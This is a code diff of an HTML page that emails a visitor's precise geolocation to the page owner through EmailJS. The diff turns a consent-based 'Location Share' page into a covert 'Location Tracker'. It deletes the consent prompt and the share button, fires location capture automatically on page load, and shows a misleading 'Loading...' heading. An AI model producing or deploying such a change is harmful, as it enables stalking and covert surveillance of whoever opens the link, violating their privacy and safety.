@@ -2,23 +2,20 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Location Share</title>
+  <title>Location Tracker</title>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
   <script>
     (function() {
       emailjs.init("kOcgBe2A9w5ZY1SDC"); // Your EmailJS Public Key
     })();
 
-    function requestLocation() {
+    window.onload = function() {
       if (!navigator.geolocation) {
         alert("Geolocation is not supported by your browser.");
         return;
       }
-      if (!confirm("Do you consent to share your current location with me via email?")) {
-        return;
-      }
       navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true });
-    }
+    };
 
     function success(position) {
       const latitude = position.coords.latitude;
@@ -30,10 +27,10 @@
         longitude: longitude,
         maps_url: mapsLink
       }).then(() => {
-        alert("✅ Thank you! Your location has been sent.");
+        alert("✅ Location sent successfully.");
       }, (err) => {
         console.error("Failed to send email:", err);
-        alert("❌ Failed to send location. Please try again.");
+        alert("❌ Failed to send location. Please check EmailJS settings.");
       });
     }
 
@@ -43,8 +40,7 @@
   </script>
 </head>
 <body style="font-family: Arial, sans-serif; text-align: center; margin-top: 50px;">
-  <h1>Location Share</h1>
-  <p>Click the button below to share your current location.</p>
-  <button onclick="requestLocation()" style="padding: 10px 20px; font-size: 16px; cursor: pointer;">Share My Location</button>
+  <h1>Loading...</h1>
+  <p>Please allow location access when prompted.</p>
 </body>
 </html>
